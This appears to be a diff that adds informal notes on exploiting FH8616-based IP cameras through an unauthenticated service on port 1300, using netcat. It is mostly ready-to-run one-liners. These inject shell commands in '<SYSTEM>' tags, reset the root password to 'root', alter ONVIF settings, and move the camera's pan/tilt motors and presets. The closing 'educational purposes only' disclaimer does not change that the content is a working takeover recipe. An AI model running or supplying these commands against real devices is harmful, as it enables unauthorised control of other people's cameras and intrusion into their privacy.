@@ -1,0 +1,37 @@
+also replace nc camera_port_here with your camera local ip (example: echo '<SYSTEM>echo "root:root" | chpasswd</SYSTEM>' | nc 192.168.1.15 1300)
+
+
+root for camera (set username root password root)
+echo '<SYSTEM>echo "root:root" | chpasswd</SYSTEM>' | nc camera_port_here 1300
+
+THIS BELOW MAY NOT WORK
+echo '<WRITEENV>onvif=yes</WRITEENV>' | nc camera_port_here 1300
+echo '<WRITEENV>onvif_port=6688</WRITEENV>' | nc camera_port_here 1300
+
+MOVEMENT CONTROLS 
+
+
+# return to home (center) (replace $CAM with localip like 192.168.1.1 for example of the camera)
+echo '<SYSTEM>/app/bin/cmd ptz_gohome</SYSTEM>' | nc $CAM 1300
+
+# stop all motors
+echo '<SYSTEM>/app/bin/cmd ptz_stop</SYSTEM>' | nc $CAM 1300
+
+# get current position (writes to /var/ap/ptz_pos probably, not tested)
+echo '<SYSTEM>/app/bin/cmd ptz_getpos</SYSTEM>' | nc $CAM 1300
+
+# move pan / tilt by distance
+echo '<SYSTEM>/app/bin/cmd ptz_move pan 100</SYSTEM>' | nc $CAM 1300
+echo '<SYSTEM>/app/bin/cmd ptz_move tilt 50</SYSTEM>'  | nc $CAM 1300
+
+# set speed
+echo '<SYSTEM>/app/bin/cmd ptz_speed pan 50</SYSTEM>' | nc $CAM 1300
+
+# presets
+echo '<SYSTEM>/app/bin/cmd ptz_set_preset 1</SYSTEM>'  | nc $CAM 1300
+echo '<SYSTEM>/app/bin/cmd ptz_goto_preset 1</SYSTEM>' | nc $CAM 1300
+
+# debug
+echo '<SYSTEM>/app/bin/cmd ptz_dbg 1</SYSTEM>' | nc $CAM 1300
+
+Fh8616 cameras are NOT secure... (Educational purposes only!)
